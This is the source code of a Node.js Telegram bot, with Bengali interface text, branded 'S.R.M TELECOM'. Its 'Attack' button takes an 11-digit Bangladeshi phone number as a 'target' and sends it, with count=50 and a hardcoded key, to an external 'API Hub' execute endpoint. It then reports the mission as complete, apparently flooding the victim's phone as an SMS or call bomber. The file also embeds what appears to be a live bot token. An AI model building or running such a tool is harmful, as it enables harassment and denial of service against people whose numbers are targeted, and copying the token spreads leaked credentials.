const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');

// --- নতুন টোকেন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const bot = new TelegramBot(token, {polling: true});

// Render/Cloud সার্ভার সচল রাখার জন্য
http.createServer((req, res) => {
    res.write("S.R.M TELECOM Server is Running!");
    res.end();
}).listen(process.env.PORT || 3000);

console.log("✅ S.R.M TELECOM নতুন টোকেন দিয়ে চালু হয়েছে...");

// প্রধান মেনু বাটন
const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 শুরু করুন (Attack)' }],
            [{ text: '📢 চ্যানেল' }, { text: '💳 হেল্প' }]
        ],
        resize_keyboard: true
    }
};

// স্টার্ট কমান্ড
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "🔥 **S.R.M TELECOM**\n\nআপনার পার্সোনাল API Hub এখন এই বটের সাথে কানেক্টেড। কাজ শুরু করতে নিচের বাটন চাপুন।", { 
        parse_mode: "Markdown", 
        reply_markup: mainMenu.reply_markup 
    });
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text === '🚀 শুরু করুন (Attack)') {
        bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", { reply_markup: { remove_keyboard: true } });
    }

    // নম্বর চেক (১১ ডিজিট এবং ০১ দিয়ে শুরু)
    else if (text && text.length === 11 && text.startsWith('01')) {
        const target = text;
        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে আপনার API Hub থেকে রিকোয়েস্ট পাঠানো হচ্ছে...`);

        try {
            // আপনার দেওয়া সেই নির্দিষ্ট API Hub লিঙ্ক
            // এখানে count=50 দেওয়া হয়েছে, আপনি চাইলে এটা পরিবর্তন করতে পারেন
            const apiUrl = `https://x-pro-prime-xyron-api-hub.onrender.com/api/v1/execute?target=${target}&count=50&key=Prime_xyron_9xm`;
            
            // রিকোয়েস্ট পাঠানো হচ্ছে
            const response = await axios.get(apiUrl, { timeout: 20000 });

            if (response.status === 200) {
                bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 স্ট্যাটাস: সফল`, { reply_markup: mainMenu.reply_markup });
            }
        } catch (e) {
            console.log("Error in API Hub:", e.message);
            bot.sendMessage(chatId, `⚠️ **API Hub এরর!**\nসম্ভবত হাবটি অফলাইনে আছে অথবা কি (Key) ভুল।`, { reply_markup: mainMenu.reply_markup });
        }
    }
});
